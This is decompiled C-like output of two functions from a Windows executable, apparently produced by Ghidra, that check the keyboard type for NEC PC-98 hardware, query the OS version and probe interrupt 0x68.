/* WARNING: Removing unreachable block (ram,0x00426e1f) */
/* WARNING: Removing unreachable block (ram,0x00426e37) */
/* WARNING: Removing unreachable block (ram,0x00426e59) */
/* WARNING: Removing unreachable block (ram,0x00426e71) */
/* WARNING: Removing unreachable block (ram,0x00426e9e) */
/* WARNING: Removing unreachable block (ram,0x00426eaa) */
/* WARNING: Removing unreachable block (ram,0x00426ecb) */
/* WARNING: Removing unreachable block (ram,0x00426f05) */
/* WARNING: Removing unreachable block (ram,0x00426f42) */
/* WARNING: Removing unreachable block (ram,0x00426f5a) */
/* WARNING: Removing unreachable block (ram,0x00426f72) */
/* WARNING: Removing unreachable block (ram,0x00426f8a) */
/* WARNING: Removing unreachable block (ram,0x00426fd0) */
/* WARNING: Removing unreachable block (ram,0x00427021) */
/* WARNING: Removing unreachable block (ram,0x00427039) */
/* WARNING: Removing unreachable block (ram,0x00427051) */
/* WARNING: Removing unreachable block (ram,0x00427069) */
/* WARNING: Removing unreachable block (ram,0x0042702d) */
/* WARNING: Removing unreachable block (ram,0x00427015) */
/* WARNING: Removing unreachable block (ram,0x00427011) */
/* WARNING: Removing unreachable block (ram,0x0042701d) */
/* WARNING: Removing unreachable block (ram,0x00426f11) */
/* WARNING: Heritage AFTER dead removal. Example location: s0xffffff64 : 0x00426f2a */
/* WARNING: Removing unreachable block (ram,0x00426f1d) */
/* WARNING: Removing unreachable block (ram,0x00427081) */
/* WARNING: Removing unreachable block (ram,0x00427041) */
/* WARNING: Removing unreachable block (ram,0x00426eb6) */
/* WARNING: Removing unreachable block (ram,0x00426d9b) */
/* WARNING: Removing unreachable block (ram,0x00426b5d) */
/* WARNING: Removing unreachable block (ram,0x00426dd7) */
/* WARNING: Removing unreachable block (ram,0x00426fe8) */
/* WARNING: Removing unreachable block (ram,0x00427029) */
/* WARNING: Removing unreachable block (ram,0x00426eef) */
/* WARNING: Removing unreachable block (ram,0x00426d33) */
/* WARNING: Removing unreachable block (ram,0x00426b21) */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */
/* WARNING: Restarted to delay deadcode elimination for space: stack */

byte * __fastcall FUN_00426a10(byte param_1,undefined2 param_2)

{
  code *pcVar1;
  uint uVar2;
  int *piVar3;
  byte *pbVar4;
  bool bVar5;
  int *in_stack_00000004;
  int iStackY_a0;
  int local_9c;
  DWORD DStackY_98;
  DWORD DStackY_88;

  bVar5 = (POPCOUNT((uint)&iStackY_a0 & 0xff) & 1U) == 0;
  local_9c = 0;
  if ((!bVar5) && (bVar5)) {
                    /* WARNING: Bad instruction - Truncating control flow here */
    halt_baddata();
  }
  uVar2 = FUN_0042708c();
  if ((uVar2 & 0xffff) == 0) {
    pcVar1 = (code *)swi(0x68);
    iStackY_a0 = (*pcVar1)();
    if (iStackY_a0 != 0x4300) {
      local_9c = 1;
    }
  }
  else {
    iStackY_a0 = 0x4300;
    local_9c = 0;
  }
  DStackY_98 = 0x94;
  piVar3 = (int *)GetVersionExA((LPOSVERSIONINFOA)&DStackY_98);
  if ((piVar3 != (int *)0x0) && (DStackY_88 != 1)) {
    local_9c = 0xf;
                    /* WARNING: Bad instruction - Truncating control flow here */
  }
  if (local_9c == 0) {
    pbVar4 = (byte *)((uint)piVar3 & 0xffff0000);
  }
  else {
    if (in_stack_00000004 != (int *)0x0) {
      *in_stack_00000004 = *in_stack_00000004 + 0x34f;
      piVar3 = in_stack_00000004;
    }
    pbVar4 = (byte *)CONCAT22((short)((uint)piVar3 >> 0x10),1);
  }
  return pbVar4;
}



/* VA 0042708c */

uint FUN_0042708c(void)

{
  uint uVar1;

  uVar1 = GetKeyboardType(0);
  if ((uVar1 == 7) &&
     ((((uVar1 = GetKeyboardType(1), uVar1 == 0xd01 || (uVar1 == 0xd02)) || (uVar1 == 0xd03)) ||
      (((uVar1 == 0xd04 || (uVar1 == 0xd05)) || ((uVar1 == 0xd06 || (uVar1 == 0xd07)))))))) {
    return CONCAT22((short)(uVar1 >> 0x10),1);
  }
  return uVar1 & 0xffff0000;
}
